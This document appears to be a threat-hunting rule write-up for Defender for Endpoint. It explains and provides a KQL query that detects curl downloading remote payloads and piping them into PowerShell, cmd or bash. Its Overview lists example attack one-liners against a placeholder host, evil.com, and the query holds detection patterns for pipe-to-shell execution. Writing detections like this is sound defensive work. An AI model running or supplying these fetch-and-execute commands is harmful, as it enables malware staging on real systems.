# Curl-Based Payload Download and Execution

## Overview

Detects the use of `curl` to download and directly execute remote payloads, a common staging technique where attackers fetch malware or scripts from attacker-controlled infrastructure and pipe them directly into a scripting engine. This avoids writing the payload to disk first, reducing forensic artifacts and bypassing some file-based detection mechanisms.

Typical attack patterns include:

```
curl http://evil.com/payload.ps1 | powershell -
curl -o %temp%\backdoor.exe http://evil.com/backdoor.exe
curl http://evil.com/stager.sh | bash
```

The query covers both direct `curl.exe` invocations and cases where curl is called within a parent scripting engine (`powershell.exe`, `cmd.exe`, `wscript.exe`, `mshta.exe`), as attackers frequently wrap the download in a one-liner executed by another process.

## MITRE ATT&CK

| Field | Value |
|-------|-------|
| **Tactic** | Command and Control, Execution |
| **Techniques** | T1105 - Ingress Tool Transfer |
| | T1059 - Command and Scripting Interpreter |

## Data Source

- `DeviceProcessEvents` (Defender for Endpoint)

## Detection Logic

1. **Identify** process events where `curl.exe` is the executing binary, or where a scripting engine's command line contains a `curl` invocation.
2. **Filter** for execution indicators — piping output directly to a scripting engine (`| powershell`, `| cmd`, `| bash`), using `Invoke-Expression` / `iex` for in-memory execution, or downloading to common staging directories (`%temp%`, `%appdata%`, user profile paths).
3. **Regex match** for the pipe-to-execute pattern (`curl ... | iex/powershell/cmd/bash`) to catch variations in whitespace and syntax.
4. **Enrich** with contextual flags: whether a LOLBin is involved, whether the target is a temp directory, and command line length as a complexity indicator.

## False Positives

- Developer tooling or CI/CD pipelines using `curl | bash` style installers (e.g., Rust's `rustup`, Homebrew, NVM).
- Automation scripts that legitimately fetch and execute configuration from trusted internal endpoints.
- Package managers or deployment agents that use curl for downloads.

Tune by adding known-good process names to an exclusion list or by filtering on specific trusted URLs in the command line.

## Customization

- **Staging paths** — Extend the `-o` output path checks if your environment uses non-standard temp or staging directories.
- **Pipe targets** — Add additional scripting engines if relevant (e.g., `python`, `ruby`, `perl` on systems where those are present).
- **Exclusions** — For environments with heavy legitimate curl usage, consider adding a `let FPPatterns` variable to exclude known-good command patterns or initiating processes.

## Query

```kql
// ============================================================================
// Curl-Based Payload Download and Execution
// Detects use of curl to download and directly execute remote payloads,
// a common technique for staging malware or running commands from attacker-
// controlled infrastructure without writing to disk first.
//
// Data source: DeviceProcessEvents (Defender XDR)
//
// Detection logic:
//   Flags curl invocations combined with direct execution indicators such as
//   piping to PowerShell/cmd, or downloading to temp directories commonly
//   used for staging. Covers curl called directly or via parent processes
//   such as powershell.exe and cmd.exe.
//
// False positives:
//   Legitimate automation or developer tooling using curl with inline
//   execution. Tune by excluding known-good InitiatingProcessFileName
//   values or specific command patterns in your environment.
//
// MITRE ATT&CK:
//   T1105  - Ingress Tool Transfer
//   T1059  - Command and Scripting Interpreter
// ============================================================================
DeviceProcessEvents
| where FileName in~ ("curl.exe", "curl")
    or (FileName in~ ("powershell.exe", "pwsh.exe", "cmd.exe", "wscript.exe", "mshta.exe")
        and ProcessCommandLine has "curl")
| where ProcessCommandLine has_any (
    "iex", "invoke-expression",
    "| powershell", "| pwsh",
    "| cmd", "| wscript",
    "| mshta",
    "-o %temp%", "-o $env:",
    "-o %appdata%", "-o C:\\Users",
    "--output %temp%"
    )
    or ProcessCommandLine matches regex @"curl.+\|\s{0,5}(iex|powershell|pwsh|cmd|bash|sh)\b"
| extend
    IsLolBin = FileName in~ ("mshta.exe", "wscript.exe", "cscript.exe"),
    TargetTempDir = ProcessCommandLine has_any ("%temp%", "$env:temp", "\\AppData\\"),
    CommandLength = strlen(ProcessCommandLine)
| project
    Timestamp,
    DeviceName,
    AccountName,
    FileName,
    ProcessCommandLine,
    InitiatingProcessFileName,
    InitiatingProcessCommandLine,
    IsLolBin,
    TargetTempDir,
    CommandLength,
    FolderPath
| order by Timestamp desc
```
